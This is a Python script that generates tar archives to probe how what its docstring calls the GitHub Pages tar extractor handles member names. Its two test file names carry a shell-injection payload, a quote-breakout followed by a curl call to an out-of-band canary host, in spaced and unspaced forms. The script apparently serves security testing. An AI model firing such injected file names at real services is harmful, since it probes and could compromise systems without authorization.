#!/usr/bin/env python3
"""
Space-discriminator probe generator for GitHub Pages tar extractor.

Two REG (typeflag 0) cases, differ ONLY in WHITESPACE — single-variable
isolation to determine whether the SPACE character in the tar member name
is the deterministic deploy rejection trigger.

Emits ./tarballs/<CASE>.tar for each case. Each tar's INTERNAL name is
exactly "artifact.tar". Structure:
  [member#1 = payload name (REG, size 0)]
  [member#2 = index.html body b"space-ok\n" (8 bytes)]

The canary path is IDENTICAL for both cases (/t) so the ONLY variable is
whitespace. Shell injection has already been ruled out by deep-1;
this run's callback expectation is ZERO.

Usage: python3 make_space_probes.py CANARY_DNS_BASE
       CANARY_DNS_BASE   e.g. abc.oast.live
"""
import io, json, os, sys, tarfile, time

INDEX_HTML = b"space-ok\n"

def build_cases(dns):
    """Returns list of (case_name, typeflag_str, member_name_str).

    Both cases share the IDENTICAL canary path '/t'. The ONLY difference is
    whitespace inside the member name.
    """
    fail_space   = f"x'; curl http://{dns}/t; #"   # spaces (repro of Q1a FAIL)
    pass_nospace = f"x';curl http://{dns}/t;#"      # NO spaces (repro of D3 PASS)
    return [
        ("FAIL_space",   "REG", fail_space),
        ("PASS_nospace", "REG", pass_nospace),
    ]

def make_tar(out_path, first_kind, first_name):
    nbytes = first_name.encode("utf-8", "surrogateescape")
    assert len(nbytes) < 100, f"name too long ({len(nbytes)}): {first_name!r}"
    with tarfile.open(out_path, "w", format=tarfile.USTAR_FORMAT) as tf:
        ti = tarfile.TarInfo(name=first_name)
        if first_kind == "DIR":
            ti.type = tarfile.DIRTYPE
            ti.mode = 0o755
        else:
            ti.type = tarfile.REGTYPE
            ti.mode = 0o644
        ti.size  = 0
        ti.mtime = 0
        ti.uid   = 0; ti.gid = 0; ti.uname = ""; ti.gname = ""
        tf.addfile(ti, io.BytesIO(b""))
        idx = tarfile.TarInfo(name="index.html")
        idx.type = tarfile.REGTYPE
        idx.mode = 0o644
        idx.size = len(INDEX_HTML)
        idx.mtime = 0
        idx.uid  = 0; idx.gid = 0; idx.uname = ""; idx.gname = ""
        tf.addfile(idx, io.BytesIO(INDEX_HTML))

def main():
    if len(sys.argv) != 2:
        print("usage: make_space_probes.py CANARY_DNS_BASE", file=sys.stderr); sys.exit(2)
    dns = sys.argv[1].strip()
    here = os.path.dirname(os.path.abspath(__file__))
    out  = os.path.join(here, "tarballs"); os.makedirs(out, exist_ok=True)
    cases = build_cases(dns)
    manifest = {}
    print(f"{'CASE':<14} {'KIND':<4} NAME(cat -v)")
    for case, kind, name in cases:
        fp = os.path.join(out, f"{case}.tar")
        make_tar(fp, kind, name)
        visible = "".join((c if 0x20 <= ord(c) < 0x7f else f"\\x{ord(c):02x}") for c in name)
        print(f"{case:<14} {kind:<4} {visible!r}")
        manifest[case] = {"kind": kind, "name": name, "file": f"{case}.tar",
                          "name_bytes_hex": name.encode('utf-8').hex()}
    with open(os.path.join(here, "manifest.json"), "w") as f:
        json.dump({"generated_at": int(time.time()), "canary_dns": dns,
                   "cases": manifest}, f, indent=2)
    print(f"Wrote {len(cases)} tars into {out}")

if __name__ == "__main__":
    main()
